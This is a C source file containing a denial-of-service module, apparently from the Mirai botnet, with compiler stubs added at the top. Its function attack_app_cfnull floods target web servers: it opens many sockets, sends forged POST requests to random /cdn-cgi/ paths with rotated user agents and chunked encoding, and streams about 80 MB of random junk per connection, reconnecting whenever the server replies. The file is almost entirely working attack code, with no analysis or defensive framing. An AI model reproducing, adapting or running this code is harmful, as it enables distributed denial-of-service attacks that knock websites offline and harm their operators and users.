#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int uint8_t ;
typedef  int uint32_t ;
struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; int /*<<< orphan*/  member_0; } ;
struct sockaddr {int dummy; } ;
struct attack_target {int netmask; int /*<<< orphan*/  addr; } ;
struct attack_option {int dummy; } ;
struct attack_cfnull_state {scalar_t__ state; int fd; char* domain; char* user_agent; int last_recv; int to_send; int last_send; int /*<<< orphan*/  dst_addr; } ;
typedef  int socklen_t ;
typedef  int /*<<< orphan*/  fd_set ;
typedef  int /*<<< orphan*/  err ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  ATK_OPT_CONNS ; 
 int /*<<< orphan*/  ATK_OPT_DOMAIN ; 
 scalar_t__ FD_ISSET (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FD_SET (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FD_ZERO (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  F_GETFL ; 
 int /*<<< orphan*/  F_SETFL ; 
 int HTTP_CONNECTION_MAX ; 
 scalar_t__ HTTP_CONN_CONNECTING ; 
 scalar_t__ HTTP_CONN_INIT ; 
 scalar_t__ HTTP_CONN_RESTART ; 
 scalar_t__ HTTP_CONN_SEND ; 
 scalar_t__ HTTP_CONN_SEND_HEADERS ; 
 scalar_t__ HTTP_CONN_SEND_JUNK ; 
 scalar_t__ HTTP_CONN_SNDBUF_WAIT ; 
 int HTTP_DOMAIN_MAX ; 
 int /*<<< orphan*/  MSG_NOSIGNAL ; 
 int O_NONBLOCK ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  SOL_SOCKET ; 
 int /*<<< orphan*/  SO_ERROR ; 
 int /*<<< orphan*/  SO_RCVBUF ; 
 int /*<<< orphan*/  TABLE_ATK_ACCEPT ; 
 int /*<<< orphan*/  TABLE_ATK_ACCEPT_LNG ; 
 int /*<<< orphan*/  TABLE_ATK_CHUNKED ; 
 int /*<<< orphan*/  TABLE_ATK_CONTENT_TYPE ; 
 int /*<<< orphan*/  TABLE_ATK_KEEP_ALIVE ; 
 int /*<<< orphan*/  TABLE_ATK_TRANSFER_ENCODING_HDR ; 
 int /*<<< orphan*/  TABLE_HTTP_FIVE ; 
 int /*<<< orphan*/  TABLE_HTTP_FOUR ; 
 int /*<<< orphan*/  TABLE_HTTP_ONE ; 
 int /*<<< orphan*/  TABLE_HTTP_THREE ; 
 int /*<<< orphan*/  TABLE_HTTP_TWO ; 
 scalar_t__ TRUE ; 
 int attack_get_opt_int (int,struct attack_option*,int /*<<< orphan*/ ,int) ; 
 char* attack_get_opt_str (int,struct attack_option*,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 struct attack_cfnull_state* calloc (int,int) ; 
 int /*<<< orphan*/  close (int) ; 
 int /*<<< orphan*/  connect (int,struct sockaddr*,int) ; 
 int fcntl (int,int /*<<< orphan*/ ,int) ; 
 int getsockopt (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int*) ; 
 int /*<<< orphan*/  htonl (scalar_t__) ; 
 int /*<<< orphan*/  htons (int) ; 
 scalar_t__ ntohl (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  rand_alphastr (char*,int) ; 
 int rand_next () ; 
 int select (int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,struct timeval*) ; 
 int send (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  setsockopt (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  table_lock_val (int /*<<< orphan*/ ) ; 
 char* table_retrieve_val (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  table_unlock_val (int /*<<< orphan*/ ) ; 
 int time (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  util_itoa (int,int,char*) ; 
 int /*<<< orphan*/  util_strcpy (char*,char*) ; 
 int util_strlen (char*) ; 
 int /*<<< orphan*/  util_zero (char*,int) ; 

void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, ii, rfd, ret = 0;
    struct attack_cfnull_state *http_table = NULL;
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);

    char generic_memes[10241] = {0};

    if (domain == NULL)
        return;

    if (util_strlen(domain) > HTTP_DOMAIN_MAX - 1)
        return;

    if (sockets > HTTP_CONNECTION_MAX)
        sockets = HTTP_CONNECTION_MAX;

    http_table = calloc(sockets, sizeof(struct attack_cfnull_state));

    for (i = 0; i < sockets; i++)
    {
        http_table[i].state = HTTP_CONN_INIT;
        http_table[i].fd = -1;
        http_table[i].dst_addr = targs[i % targs_len].addr;

        util_strcpy(http_table[i].domain, domain);

        if (targs[i % targs_len].netmask < 32)
            http_table[i].dst_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));

        switch(rand_next() % 5)
        {
            case 0:
                table_unlock_val(TABLE_HTTP_ONE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ONE, NULL));
                table_lock_val(TABLE_HTTP_ONE);
                break;
            case 1:
                table_unlock_val(TABLE_HTTP_TWO);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
                table_lock_val(TABLE_HTTP_TWO);
                break;
            case 2:
                table_unlock_val(TABLE_HTTP_THREE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THREE, NULL));
                table_lock_val(TABLE_HTTP_THREE);
                break;
            case 3:
                table_unlock_val(TABLE_HTTP_FOUR);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOUR, NULL));
                table_lock_val(TABLE_HTTP_FOUR);
                break;
            case 4:
                table_unlock_val(TABLE_HTTP_FIVE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVE, NULL));
                table_lock_val(TABLE_HTTP_FIVE);
                break;
        }
    }

    while(TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        int mfd = 0, nfds;
        struct timeval tim;
        struct attack_cfnull_state *conn;
        uint32_t fake_time = time(NULL);

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->state == HTTP_CONN_RESTART)
            {
                conn->state = HTTP_CONN_INIT;
            }

            if (conn->state == HTTP_CONN_INIT)
            {
                struct sockaddr_in addr = {0};

                if (conn->fd != -1)
                    close(conn->fd);
                if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    continue;

                fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

                ii = 65535;
                setsockopt(conn->fd, 0, SO_RCVBUF, &ii ,sizeof(int));

                addr.sin_family = AF_INET;
                addr.sin_addr.s_addr = conn->dst_addr;
                addr.sin_port = htons(80);

                conn->last_recv = fake_time;
                conn->state = HTTP_CONN_CONNECTING;
                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
#ifdef DEBUG
                printf("[http flood] fd%d started connect\n", conn->fd);
#endif

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CONNECTING)
            {
                if (fake_time - conn->last_recv > 30)
                {
                    conn->state = HTTP_CONN_INIT;
                    close(conn->fd);
                    conn->fd = -1;
                    continue;
                }

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SEND_HEADERS)
            {
#ifdef DEBUG
                //printf("[http flood] Sending http request\n");
#endif

                char buf[10240];
                util_zero(buf, 10240);

                //util_strcpy(buf + util_strlen(buf), "POST /cdn-cgi/l/chk_captcha HTTP/1.1\r\nUser-Agent: ");
                util_strcpy(buf + util_strlen(buf), "POST /cdn-cgi/");
                rand_alphastr(buf + util_strlen(buf), 16);
                util_strcpy(buf + util_strlen(buf), " HTTP/1.1\r\nUser-Agent: ");
                util_strcpy(buf + util_strlen(buf), conn->user_agent);
                util_strcpy(buf + util_strlen(buf), "\r\nHost: ");
                util_strcpy(buf + util_strlen(buf), conn->domain);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_KEEP_ALIVE, NULL));
                table_lock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT, NULL));
                table_lock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT_LNG, NULL));
                table_lock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_CONTENT_TYPE);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_TYPE, NULL));
                table_lock_val(TABLE_ATK_CONTENT_TYPE);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL));
                table_lock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
                util_strcpy(buf + util_strlen(buf), " ");
                table_unlock_val(TABLE_ATK_CHUNKED);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CHUNKED, NULL));
                table_lock_val(TABLE_ATK_CHUNKED);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                util_strcpy(buf + util_strlen(buf), "\r\n");

                conn->to_send = (80 * 1024 * 1024);

#ifdef DEBUG
                if (sockets == 1)
                {
                    printf("sending buf: \"%s\"\n", buf);
                }
#endif

                send(conn->fd, buf, util_strlen(buf), MSG_NOSIGNAL);
                conn->last_send = fake_time;

                conn->state = HTTP_CONN_SEND_JUNK;
                FD_SET(conn->fd, &fdset_wr);
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SEND_JUNK)
            {
                int sent = 0;
                char rndbuf[1025] = {0};
                util_zero(rndbuf, 1025);
                rand_alphastr(rndbuf, 1024);

                if (conn->to_send <= 0)
                {
                    send(conn->fd, "0\r\n", 3, MSG_NOSIGNAL);
                } else {
                    // EZZZZZZZZZ HACKS
                    if (conn->to_send < 1024)
                        rndbuf[conn->to_send] = 0;

                    if ((conn->to_send >= 1024 && (conn->to_send % 1024) == 0))
                    {
                        char szbuf[4] = {0};
                        util_zero(szbuf, 4);
                        util_itoa(1024, 16, szbuf);
                        send(conn->fd, szbuf, util_strlen(szbuf), MSG_NOSIGNAL);
                        send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                    }

                    if ((sent = send(conn->fd, rndbuf, util_strlen(rndbuf), MSG_NOSIGNAL)) == -1)
                    {
                        conn->state = HTTP_CONN_RESTART;
                        continue;
                    }

                    // if our local send buffer is full, slow down. no need to rush (^:
                    if (sent != util_strlen(rndbuf))
                    {
                        conn->state = HTTP_CONN_SNDBUF_WAIT;
                    }

                    conn->to_send -= sent;
                    FD_SET(conn->fd, &fdset_wr);
                }

                conn->last_send = fake_time;
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SNDBUF_WAIT)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else
            {
                // NEW STATE WHO DIS
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
        }

        if (mfd == 0)
            continue;

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(mfd, &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        if (nfds < 1)
            continue;

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                if (conn->state == HTTP_CONN_CONNECTING)
                {
                    int err = 0;
                    socklen_t err_len = sizeof (err);

                    ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                    if (err == 0 && ret == 0)
                    {
#ifdef DEBUG
                        printf("[http flood] FD%d connected.\n", conn->fd);
#endif
                        conn->state = HTTP_CONN_SEND;
                    }
                    else
                    {
#ifdef DEBUG
                        printf("[http flood] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = HTTP_CONN_INIT;
                        continue;
                    }
                }
                else if (conn->state == HTTP_CONN_SNDBUF_WAIT)
                {
					conn->state = HTTP_CONN_SEND_JUNK;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                // if we get any sort of headers or error code then punt it.
                // we really dont care about any content we get
                conn->state = HTTP_CONN_RESTART;
            }
        }

        // handle any sockets that didnt return from select here
        // also handle timeout on HTTP_CONN_QUEUE_RESTART just in case there was no other data to be read (^: (usually this will never happen)
#ifdef DEBUG
        if (sockets == 1)
        {
            printf("debug mode sleep\n");
            sleep(1);
        }
#endif
    }
}